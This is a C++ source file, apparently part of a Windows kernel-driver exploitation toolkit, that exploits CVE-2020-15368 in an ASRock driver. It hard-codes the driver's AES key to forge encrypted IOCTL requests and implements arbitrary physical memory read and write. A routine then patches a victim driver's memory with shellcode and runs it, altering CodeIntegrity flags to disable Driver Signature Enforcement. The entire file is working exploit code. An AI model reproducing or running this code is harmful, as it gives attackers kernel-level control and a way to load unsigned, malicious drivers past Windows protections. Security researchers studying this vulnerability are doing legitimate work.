/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022
*
*  TITLE:       ASRDRV.CPP
*
*  VERSION:     1.28
*
*  DATE:        22 Nov 2022
*
*  ASRock driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/asrdrv.h"

//
// Based on CVE-2020-15368
//

#define ASROCK_AES_KEY          "C110DD4FE9434147B92A5A1E3FDBF29A"
#define ASROCK_AES_KEY_LENGTH   sizeof(ASROCK_AES_KEY) - sizeof(CHAR)

#ifdef __cplusplus
extern "C" {
    void BaseShellDSEFix();
    void BaseShellDSEFixEnd();
}
#endif

/*
* AsrEncryptDriverRequest
*
* Purpose:
*
* Encrypt ASRock driver request with AES.
*
*/
BOOL AsrEncryptDriverRequest(
    _In_ PUCHAR DriverRequest,
    _In_ ULONG RequestSize,
    _Inout_ PVOID* EncodedData,
    _Inout_ ULONG* EncodedSize
)
{
    BOOL bResult = FALSE;

    NTSTATUS status;

    ASRDRV_REQUEST request;
    ASRDRV_REQUEST_FOOTER* requestFooter;

    BCRYPT_ALG_HANDLE hAlgAes = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;

    HANDLE heapCNG = NULL;

    PBYTE pbCipherData = NULL;
    DWORD cbCipherData;
    DWORD cbResult = 0;

    BYTE encKey[32];

    RtlSecureZeroMemory(&request, sizeof(request));
    RtlSecureZeroMemory(&encKey, sizeof(encKey));
    request.SizeOfIv = sizeof(request.Iv);

    RtlFillMemory(request.Iv, sizeof(request.Iv), 69);
    RtlFillMemory(request.Key, sizeof(request.Key), 69);

    do {

        RtlCopyMemory(&encKey, ASROCK_AES_KEY, ASROCK_AES_KEY_LENGTH);
        RtlCopyMemory(&encKey[13], request.Key, sizeof(request.Key));

        heapCNG = HeapCreate(0, 0, 0);
        if (heapCNG == NULL)
            break;

        if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(
            &hAlgAes,
            BCRYPT_AES_ALGORITHM,
            NULL,
            0)))
        {
            break;
        }

        if (!NT_SUCCESS(BCryptGenerateSymmetricKey(
            hAlgAes,
            &hKey,
            NULL,
            0,
            encKey,
            sizeof(encKey),
            0)))
        {
            break;
        }

        PUCHAR pbIv = (PUCHAR)HeapAlloc(heapCNG, HEAP_ZERO_MEMORY, request.SizeOfIv);
        if (pbIv) {

            RtlCopyMemory(pbIv, request.Iv, request.SizeOfIv);

            cbCipherData = RequestSize + 64;

            pbCipherData = (PBYTE)HeapAlloc(heapCNG, HEAP_ZERO_MEMORY, cbCipherData);
            if (pbCipherData) {

                status = BCryptEncrypt(hKey,
                    DriverRequest,
                    RequestSize,
                    NULL,
                    pbIv,
                    request.SizeOfIv,
                    pbCipherData,
                    cbCipherData,
                    &cbResult,
                    BCRYPT_BLOCK_PADDING);

                bResult = NT_SUCCESS(status);

            }

        }


    } while (FALSE);

    if (hKey != NULL)
        BCryptDestroyKey(hKey);

    if (hAlgAes != NULL)
        BCryptCloseAlgorithmProvider(hAlgAes, 0);

    if (bResult && cbResult) {

        ULONG outSize = sizeof(ASRDRV_REQUEST) +
            cbResult +
            sizeof(ASRDRV_REQUEST_FOOTER);

        PBYTE result = (PBYTE)supHeapAlloc(outSize);

        if (result) {

            RtlCopyMemory(result, &request, sizeof(request));

            RtlCopyMemory(RtlOffsetToPointer(result, sizeof(ASRDRV_REQUEST)),
                pbCipherData,
                cbResult);

            requestFooter = (ASRDRV_REQUEST_FOOTER*)RtlOffsetToPointer(result, 
                outSize - sizeof(ASRDRV_REQUEST_FOOTER));

            requestFooter->Size = cbResult;

            *EncodedData = result;
            *EncodedSize = outSize;
        }

    }

    if (heapCNG) HeapDestroy(heapCNG);

    return bResult;
}

/*
* AsrCallDriver
*
* Purpose:
*
* Call ASRock driver with encrypted context.
*
*/
BOOL AsrCallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ ASRDRV_ARGS* Arguments
)
{
    ASRDRV_COMMAND command;
    PVOID pvEncryptedCommand = NULL;
    DWORD cbEncryptedCommand = 0;

    IO_STATUS_BLOCK ioStatus;

    BYTE outBuffer[PAGE_SIZE];

    RtlSecureZeroMemory(&command, sizeof(command));

    command.OperationCode = IoControlCode;
    RtlCopyMemory(&command.Arguments, Arguments, sizeof(ASRDRV_ARGS));

    if (!AsrEncryptDriverRequest((PUCHAR)&command,
        sizeof(command),
        &pvEncryptedCommand,
        &cbEncryptedCommand))
    {
        return FALSE;
    }

    RtlSecureZeroMemory(&outBuffer, sizeof(outBuffer));
    RtlSecureZeroMemory(&ioStatus, sizeof(ioStatus));

    NTSTATUS status = supCallDriverEx(DeviceHandle,
        IOCTL_ASRDRV_EXEC_DISPATCH,
        pvEncryptedCommand,
        cbEncryptedCommand,
        &outBuffer,
        sizeof(outBuffer),
        &ioStatus);

    return NT_SUCCESS(status);
}

/*
* AsrReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI AsrReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    ASRDRV_ARGS args;

    RtlSecureZeroMemory(&args, sizeof(args));
    args.qwordArgs[0] = PhysicalAddress;
    args.dwordArgs[2] = NumberOfBytes;
    args.dwordArgs[3] = AsrGranularityDword;
    args.qwordArgs[2] = (DWORD64)Buffer;

    return AsrCallDriver(DeviceHandle,
        IOCTL_ASRDRV_READ_MEMORY,
        &args);
}

/*
* AsrWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI AsrWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    ASRDRV_ARGS args;

    RtlSecureZeroMemory(&args, sizeof(args));
    args.qwordArgs[0] = PhysicalAddress;
    args.dwordArgs[2] = NumberOfBytes;
    args.dwordArgs[3] = AsrGranularityByte;
    args.qwordArgs[2] = (DWORD64)Buffer;

    return AsrCallDriver(DeviceHandle,
        IOCTL_ASRDRV_WRITE_MEMORY,
        &args);
}

/*
* AsrControlDSE
*
* Purpose:
*
* Change Windows CodeIntegrity flags state via ASRock driver.
*
*/
BOOL AsrControlDSE(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG DSEValue,
    _In_ ULONG_PTR Address
)
{
    BOOL bResult = FALSE;
    unsigned char shellBuffer[200];
    SIZE_T shellSize = (ULONG_PTR)BaseShellDSEFixEnd - (ULONG_PTR)BaseShellDSEFix;

    KDU_PROVIDER* prov;
    KDU_VICTIM_PROVIDER* victimProv;
    HANDLE victimDeviceHandle = NULL;

    KDU_PHYSMEM_ENUM_PARAMS enumParams;

    prov = Context->Provider;
    victimProv = Context->Victim;

    RtlFillMemory(shellBuffer, sizeof(shellBuffer), 0xCC);
    RtlCopyMemory(shellBuffer, BaseShellDSEFix, shellSize);

    *(PULONG_PTR)&shellBuffer[0x2] = Address;
    *(PULONG_PTR)&shellBuffer[0xC] = DSEValue;


    if (shellSize > sizeof(shellBuffer)) {
        supPrintfEvent(kduEventError,
            "[!] Patch code size 0x%llX exceeds limit 0x%llX, abort\r\n", shellSize, sizeof(shellBuffer));

        return FALSE;
    }

    //
    // Load/open victim.
    //
    if (VpCreate(victimProv,
        Context->ModuleBase,
        &victimDeviceHandle))
    {
        printf_s("[+] Victim is accepted, handle 0x%p\r\n", victimDeviceHandle);
    }
    else {

        supPrintfEvent(kduEventError,
            "[!] Error preloading victim driver, abort\r\n");

        return FALSE;
    }

    enumParams.bWrite = TRUE;
    enumParams.cbPagesFound = 0;
    enumParams.cbPagesModified = 0;
    enumParams.Context = Context;
    enumParams.pvPayload = shellBuffer;
    enumParams.cbPayload = (ULONG)shellSize;

    supPrintfEvent(kduEventInformation,
        "[+] Looking for %ws driver dispatch memory pages, please wait\r\n", victimProv->Name);

    if (supEnumeratePhysicalMemory(KDUProcExpPagePatchCallback, &enumParams)) {

        printf_s("[+] Number of pages found: %llu, modified: %llu\r\n",
            enumParams.cbPagesFound,
            enumParams.cbPagesModified);

        //
        // Run shellcode.
        //
        VpExecutePayload(victimProv, &victimDeviceHandle);

        supPrintfEvent(kduEventInformation,
            "[+] DSE patch executed successfully\r\n");
    }

    //
    // Ensure victim handle is closed.
    //
    if (victimDeviceHandle) {
        NtClose(victimDeviceHandle);
        victimDeviceHandle = NULL;
    }

    //
    // Cleanup.
    //
    if (VpRelease(victimProv, &victimDeviceHandle)) {
        printf_s("[+] Victim released\r\n");
    }

    return bResult;
}
